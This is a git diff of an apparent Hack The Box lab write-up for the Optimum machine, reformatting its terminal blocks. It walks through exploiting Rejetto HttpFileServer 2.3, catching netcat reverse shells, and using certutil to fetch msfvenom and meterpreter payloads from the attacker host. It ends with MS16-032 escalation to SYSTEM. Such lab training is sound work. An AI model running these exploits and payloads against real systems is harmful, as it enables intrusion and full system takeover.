@@ -27,8 +27,7 @@ A reliable source tells me that this is the optimum box to do right now.  So her
 
 Run nmap and get a list of the ports.  Notice that there is HttpFileServer, version 2.3, running on port 80.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.8  
 [sudo] password for kali: 
@@ -56,14 +55,13 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 21.23 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run nmap against all the ports to try and find any unsual services.
 
-{% raw %}
-```sh
+{% capture nmapfull %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.8    
 [sudo] password for kali: 
@@ -75,14 +73,13 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 115.85 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmapfull %}
 
 <br />
 Run the searchsploit for the HttpFileServer 2.3 to find any potential exploits.
 
-{% raw %}
-```sh
+{% capture searchsploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ searchsploit HttpFileServer                  
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -91,18 +88,17 @@ Run the searchsploit for the HttpFileServer 2.3 to find any potential exploits.
 Rejetto HttpFileServer 2.3.x - Remote Command Execution (3)                                                                                                                                               | windows/webapps/49125.py
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=searchsploit %}
 
 <br />
 Copy the exploit into the local working folder.
 
-{% raw %}
-```sh
+{% capture copylocalfolder %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ cp `locate 49125.py` .
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=copylocalfolder %}
 
 <br />
 Search the exploit-db for the same http file server.
@@ -117,8 +113,7 @@ Search the exploit-db for the same http file server.
 <br />
 Download ye old exploit.
 
-{% raw %}
-```sh
+{% capture downloadexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ wget https://www.exploit-db.com/raw/39161 -O exploit.py                                           
 --2025-02-02 16:19:17--  https://www.exploit-db.com/raw/39161
@@ -131,14 +126,13 @@ Saving to: ‘exploit.py’
 exploit.py                                                 100%[========================================================================================================================================>]   2.46K  --.-KB/s    in 0s      
 
 2025-02-02 16:19:19 (73.8 MB/s) - ‘exploit.py’ saved [2515/2515]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadexploit %}
 
 <br />
 Update the exploit ip_addr and local_port variables to the attack machine LHOST and LPORT.
 
-{% raw %}
-```sh
+{% capture updateexploit %}
 #!/usr/bin/python
 # Exploit Title: HttpFileServer 2.3.x Remote Command Execution
 # Google Dork: intext:"httpfileserver 2.3"
@@ -157,14 +151,13 @@ Update the exploit ip_addr and local_port variables to the attack machine LHOST 
 	local_port = "443" # Local Port number
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='python' title='exploit.py' content=updateexploit %}
 
 <br />
 Transfer nc.exe into the local working folder and start a python webserver listening on port 80.
 
-{% raw %}
-```sh
+{% capture pyserver %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ cp `locate nc.exe` .  
                                                                                                                                                                                                                                             
@@ -172,56 +165,58 @@ Transfer nc.exe into the local working folder and start a python webserver liste
 └─$ sudo nc -nlvp 80                             
 [sudo] password for kali: 
 listening on [any] 80 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=pyserver %}
 
 <br />
 Start a netcat listener.
 
-{% raw %}
-```sh
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ sudo nc -nlvp 443                                        
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startlistener %}
 
 <br />
 Execute the listener.  I had to run it twice to get it to work.
 
-{% raw %}
-```sh
+{% capture runexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ python2 exploit.py 10.10.10.8 80
                                                                                                                                                                                                                                             
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ python2 exploit.py 10.10.10.8 80
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runexploit %}
 
 <br />
 Check the listener and catch that sweet, sweet shell.
 
-{% raw %}
-```sh
+{% capture catchfootholdshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ sudo nc -nlvp 443                                        
 [sudo] password for kali: 
 listening on [any] 443 ...
 connect to [10.10.16.12] from (UNKNOWN) [10.10.10.8] 49187
+{% endcapture %}
+
+{% capture windowsfootholdshell %}
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 
 C:\Users\kostas\Desktop>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catchfootholdshell %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=windowsfootholdshell %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```sh
+{% capture userflag %}
 C:\Users\kostas\Desktop>type user.txt
 type user.txt
 <redacted>
@@ -243,14 +238,13 @@ Tunnel adapter isatap.{99C463C2-DC10-45A6-9CC8-E62F160519AE}:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . :
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=userflag %}
 
 <br >
 Run the whoami and the whoami /priv to see who we are and what privileges that we have.
 
-{% raw %}
-```sh
+{% capture whoamis %}
 C:\Users\kostas\Desktop>whoami
 whoami
 optimum\kostas
@@ -265,14 +259,13 @@ Privilege Name                Description                    State
 ============================= ============================== ========
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=whoamis %}
 
 <br />
 Run systeminfo to get an understanding of what environment the we are in.  We know the version of Windows, architecture, and hotfixes applied.
 
-{% raw %}
-```sh
+{% capture systeminfo %}
 C:\Users\kostas\Desktop>systeminfo
 systeminfo
 
@@ -346,8 +339,8 @@ Network Card(s):           1 NIC(s) Installed.
                                  IP address(es)
                                  [01]: 10.10.10.8
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=systeminfo %}
 
 <br />
 Searching for that version of Windows we stumble across MS16-032 PowerShell script.
@@ -362,8 +355,7 @@ Searching for that version of Windows we stumble across MS16-032 PowerShell scri
 <br />
 Download the PowerShell script.
 
-{% raw %}
-```sh
+{% capture downloadpowershellscript %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ wget https://www.exploit-db.com/raw/39719 -O MS16-032.ps1    
 --2025-02-09 00:28:42--  https://www.exploit-db.com/raw/39719
@@ -376,72 +368,108 @@ Saving to: ‘MS16-032.ps1’
 MS16-032.ps1                                                   [  <=>                                                                                                                                    ]  11.55K  56.0KB/s    in 0.2s    
 
 2025-02-09 00:28:43 (56.0 KB/s) - ‘MS16-032.ps1’ saved [11829]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadpowershellscript %}
 
 <br />
 Transfer the exploit to the victim machine.
 
-{% raw %}
-```sh
+{% capture transferpowershell %}
 C:\Users\kostas\Desktop>certutil.exe -urlcache -f http://10.10.16.12/MS16-032.ps1 MS16-032.ps1
 certutil.exe -urlcache -f http://10.10.16.12/MS16-032.ps1 MS16-032.ps1
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=transferpowershell %}
 
 <br />
-Try the exploit multiple times and it would always hand the shell.  Control+c and reget the shell and repeat.
+Try the exploit multiple times and it would always land the shell.  Control+c and reset the shell and repeat.
 
-{% raw %}
-```sh
+<u>Run 1</u>
+{% capture failureone %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ sudo nc -nlvp 443
 listening on [any] 443 ...
 connect to [10.10.16.12] from (UNKNOWN) [10.10.10.8] 49243
+{% endcapture %}
+
+{% capture failureonewindows %}
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 
 C:\Users\kostas\Desktop>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noexit "& "C:\Users\kostas\Desktop\MS16-032.ps1"
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noexit "& "C:\Users\kostas\Desktop\MS16-032.ps1"
 ^C
-                                                                                                                                                                                                                                            
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=failureone %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=failureonewindows %}
+
+<u>Run 2</u>
+
+{% capture failuretwo %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ sudo nc -nlvp 443
 listening on [any] 443 ...
 connect to [10.10.16.12] from (UNKNOWN) [10.10.10.8] 49247
+{% endcapture %}
+
+{% capture failuretwowindows %}
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 
 C:\Users\kostas\Desktop>powershell -exec bypass
 powershell -exec bypass
 Windows PowerShell 
+{% endcapture %}
+
+{% capture failuretwopowershell %}
 Copyright (C) 2014 Microsoft Corporation. All rights reserved.
 
 ^C
-                                                                                                                                                                                                                                            
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=failuretwo %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=failuretwowindows %}
+
+{% include terminal.html language='powershell' title='PowerShell' content=failuretwopowershell %}
+
+<u>Run 3</u>
+
+{% capture failurethree %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ sudo nc -nlvp 443
 listening on [any] 443 ...
 connect to [10.10.16.12] from (UNKNOWN) [10.10.10.8] 49251
+{% endcapture %}
+
+{% capture failurethreewindows %}
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 
 C:\Users\kostas\Desktop>c:\windows\sysnative\windowspowershell\v1.0\powershell.exe
 c:\windows\sysnative\windowspowershell\v1.0\powershell.exe
 Windows PowerShell
+{% endcapture %}
+
+{% capture failurethreepowershell %}
 Copyright (C) 2014 Microsoft Corporation. All rights reserved.
 
 PS C:\Users\kostas\Desktop> Set-ExecutionPolicy -ExecutionPolicy unrestricted
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=failurethree %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=failurethreewindows %}
+
+{% include terminal.html language='powershell' title='PowerShell' content=failurethreepowershell %}
 
 <br />
 Create an msfvenom using a powershell payload.
 
-{% raw %}
-```sh
+{% capture genpsexe %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.16.12 LPORT=4444 -f exe -o psshell.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -450,65 +478,66 @@ No encoder specified, outputting raw payload
 Payload size: 1887 bytes
 Final size of exe file: 8192 bytes
 Saved as: psshell.exe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=genpsexe %}
 
 <br />
 Set up a brand-spanking-new listener to catch the new payload.
 
-{% raw %}
-```sh
+{% capture listener4444 %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ nc -nlvp 4444
 listening on [any] 4444 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=listener4444 %}
 
 <br />
 Transfer to the victim machine.
 
-{% raw %}
-```sh
+{% capture transferpsexe %}
 C:\Users\kostas\Desktop>certutil.exe -urlcache -f http://10.10.16.12/psshell.exe psshell.exe
 certutil.exe -urlcache -f http://10.10.16.12/psshell.exe psshell.exe
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=transferpsexe %}
 
 <br />
 Execute the executable exploit.
 
-{% raw %}
-```sh
+{% capture executepsexe %}
 C:\Users\kostas\Desktop>.\psshell.exe
 .\psshell.exe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=executepsexe %}
 
 <br />
 Check the 4444 listener and catch the new shell and notice we are in PowerShell now.
 
-{% raw %}
-```sh
+{% capture catchpsexeshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ nc -nlvp 4444
 listening on [any] 4444 ...
 connect to [10.10.16.12] from (UNKNOWN) [10.10.10.8] 49263
+{% endcapture %}
+
+{% capture catchpsexeshellpowershell %}
 Windows PowerShell running as user kostas on OPTIMUM
 Copyright (C) Microsoft Corporation. All rights reserved.
 
 whoami
 optimum\kostas
 PS C:\Users\kostas\Desktop>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catchpsexeshell %}
+
+{% include terminal.html language='powershell' title='PowerShell' content=catchpsexeshellpowershell %}
 
 <br />
 Try to importing the exploit module and Invoke the exploit.  Not that it appears to work but we are still the same user.
 
-{% raw %}
-```sh
+{% capture anotherfailedattempt %}
 PS C:\Users\kostas\Desktop> Import-Module C:\Users\kostas\Desktop\MS16-032.ps1
 PS C:\Users\kostas\Desktop> Invoke-MS16-032
          __ __ ___ ___   ___     ___ ___ ___ 
@@ -540,14 +569,13 @@ PS C:\Users\kostas\Desktop> Invoke-MS16-032
 
 PS C:\Users\kostas\Desktop> whoami
 optimum\kostas
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='powershell' title='PowerShell' content=anotherfailedattempt %}
 
 <br />
 Use msfvenom to generate a meterpreter payload.
 
-{% raw %}
-```sh
+{% capture genmeter %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.12 LPORT=4444 -f exe -o meter.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -556,14 +584,13 @@ No encoder specified, outputting raw payload
 Payload size: 354 bytes
 Final size of exe file: 73802 bytes
 Saved as: meter.exe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=genmeter %}
 
 <br />
 Set up an exploit/multi/handler to catch the third shell.
 
-{% raw %}
-```sh
+{% capture metermulti %}
 ┌──(kali㉿kali)-[~/Documents/htb/optimum]
 └─$ msfconsole -q                                                                               
 msf6 > use exploit/multi/handler
@@ -597,50 +624,46 @@ msf6 exploit(multi/handler) > set lhost tun0
 lhost => 10.10.16.12
 msf6 exploit(multi/handler) > exploit
 [*] Started reverse TCP handler on 10.10.16.12:4444
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=metermulti %}
 
 <br />
 Transfer the third payload to the victim machine.
 
-{% raw %}
-```sh
+{% capture transferthirdpayload %}
 C:\Users\kostas\Desktop>certutil.exe -urlcache -f http://10.10.16.12/meter.exe meter.exe
 certutil.exe -urlcache -f http://10.10.16.12/meter.exe meter.exe
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=transferthirdpayload %}
 
 <br />
 Execute the third payload.
 
-{% raw %}
-```sh
+{% capture executethirdpayload %}
 C:\Users\kostas\Desktop>.\meter.exe
 .\meter.exe
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=executethirdpayload %}
 
 <br />
 Check the multi/handler and catch our fancy meterpreter session.
 
-{% raw %}
-```sh
+{% capture metersession %}
 msf6 exploit(multi/handler) > exploit
 [*] Started reverse TCP handler on 10.10.16.12:4444 
 [*] Sending stage (177734 bytes) to 10.10.10.8
 [*] Meterpreter session 1 opened (10.10.16.12:4444 -> 10.10.10.8:49206) at 2025-02-08 23:41:49 +1100
 
 meterpreter >
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=metersession %}
 
 <br />
 Background the session and run local exploit suggester.
 
-{% raw %}
-```sh
+{% capture exploitsugger %}
 msf6 exploit(multi/handler) > search suggester
 
 Matching Modules
@@ -727,14 +750,13 @@ msf6 post(multi/recon/local_exploit_suggester) > exploit
  42  exploit/windows/local/webexec                                  No                       The check raised an exception.
 
 [*] Post module execution completed
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=exploitsugger %}
 
 <br />
 Run the MS16-032 exploit like we were trying to do before.  Finally, got it to work.  Bingo!
 
-{% raw %}
-```sh
+{% capture run032 %}
 msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit
 [*] Started reverse TCP handler on 10.10.16.12:4444 
 [+] Compressed size: 1160
@@ -795,20 +817,25 @@ l4VzL2YXtZ4WM0iAaKwmaKTZqLirKUFn
 meterpreter > shell
 Process 2664 created.
 Channel 1 created.
+{% endcapture %}
+
+{% capture admwindowsshell %}
 Microsoft Windows [Version 6.3.9600]
 (c) 2013 Microsoft Corporation. All rights reserved.
 
 C:\Users\kostas\Desktop>whoami
 whoami
 nt authority\system
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=run032 %}
+
+{% include terminal.html language='cmd' title='cmd.exe' content=admwindowsshell %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```sh
+{% capture rootflag %}
 C:\Users\kostas\Desktop>type C:\Users\Administrator\Desktop\root.txt
 type C:\Users\Administrator\Desktop\root.txt
 <redacted>
@@ -830,8 +857,8 @@ Tunnel adapter isatap.{99C463C2-DC10-45A6-9CC8-E62F160519AE}:
 
    Media State . . . . . . . . . . . : Media disconnected
    Connection-specific DNS Suffix  . :
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='cmd' title='cmd.exe' content=rootflag %}
 
 <br />
 Hmmm.  We got the flag.  I might revisit later to get the manual exploit to work.  Not sure.  Either way, hope you enjoyed.
